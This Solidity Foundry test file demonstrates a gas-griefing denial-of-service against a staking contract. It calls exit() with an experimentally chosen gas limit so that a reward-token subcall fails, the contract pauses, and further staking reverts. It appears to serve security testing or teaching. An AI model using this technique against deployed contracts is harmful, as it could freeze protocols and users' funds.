// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Staking.sol";

import "../src/tokens/MockERC20.sol";
import "../src/tokens/RewardToken.sol";
import "../src/tokens/StakingToken.sol";

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

/**
 * Vulnerability: Insufficient gas griefing
 * When a contract makes a sub-call to another contract, the EVM limits
 * the gas forwarded to 63/64 of the remaining gas (EIP-150)
 * In our example here, function staking.exit() makes a subcall to RewardToken,
 * which uses a lot of gas (>500k gas). If we dont send enough gas to execute
 * the subcall to RewardToken, it fails, but since 1/64 remains in the calling contract
 * (>7k gas), theres still enough gas left to pause the contract
 */
contract StakingTest is Test {
    address internal alice = vm.addr(10);

    RewardToken internal rtk;
    StakingToken internal stk;
    MultiRewards internal staking;
    MockERC20 internal token;

    // 1 week
    uint256 duration = 86400 * 7;

    function setUp() public {
        // deploy erc20s for rewardtoken
        token = new MockERC20();

        // deploy reward token: Name, Symbol, lpaddress
        rtk = new RewardToken("RewardToken", "RTK", vm.addr(100));

        // add mock erc20 as rewardtoken for RTK (to increase gas)
        rtk.addReward(address(token), address(this), duration);

        // deploy staking token + staking contract
        stk = new StakingToken();
        staking = new MultiRewards(address(stk));

        // add rewardToken as reward for staking contract
        staking.addReward(address(rtk), address(this), duration);
        rtk.mint(address(this), 10 * 10 ** 9 * 10 ** 18);
        rtk.approve(address(staking), 2 ** 256 - 1);
        staking.notifyRewardAmount(address(rtk), 1000_000 * 10 ** 18);

        // set up alice
        setUpAccounts();
    }

    function setUpAccounts() public {
        // give alice eth
        vm.deal(alice, 1 ether);

        // claim staking token, approve staking contract to move STK
        vm.startPrank(alice);
        stk.faucet();
        stk.approve(address(staking), 2 ** 256 - 1);
        vm.stopPrank();
    }

    function testExit() public {
        vm.startPrank(alice);

        // stake tokens
        staking.stake(1 wei);
        vm.warp(10000);
        staking.stake(1 wei);

        // exit, i.e. withdraw and getreward() with not enough gas
        // gas is determined experimentally
        staking.exit{gas: 525000}();

        // should pause contract
        vm.expectRevert("Pausable: paused");
        staking.stake(1 wei);

        vm.stopPrank();
    }
}
